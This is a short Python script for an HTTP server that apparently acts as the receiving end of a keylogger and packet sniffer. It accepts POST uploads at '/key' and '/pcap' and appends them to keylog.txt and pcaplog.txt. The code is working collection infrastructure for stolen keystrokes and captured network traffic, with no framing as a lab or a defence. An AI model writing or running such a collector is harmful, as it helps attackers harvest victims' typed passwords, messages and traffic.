from http.server import BaseHTTPRequestHandler, HTTPServer
import os

class server(BaseHTTPRequestHandler):
    def do_POST(self):
        file_data = self.rfile.read(int(self.headers["content-length"]))
        if int(self.headers["content-length"]) == 0:
            self.send_error(404)
        else:
            if self.path == "/key":
                print(file_data)
                with open("keylog.txt", "a") as f:
                    f.write(file_data.decode('utf-8') + "\n")
                self.send_response(200)
                self.end_headers()
            
            elif self.path == "/pcap":
                with open("pcaplog.txt", "a") as f:
                    f.write(file_data.decode('utf-8') + "\n")
                self.send_response(200)
                self.end_headers()

def main():
    if not os.path.exists("keylog.txt"):
        with open("keylog.txt", "w") as f:
            pass
    if not os.path.exists("pcaplog.txt"):
        with open("pcaplog.txt", "w") as f:
            pass
    print("Server intialising...")
    httpd = HTTPServer(("localhost", 5000), server)
    print("Server active")
    httpd.serve_forever()

if __name__ == "__main__":
    main()
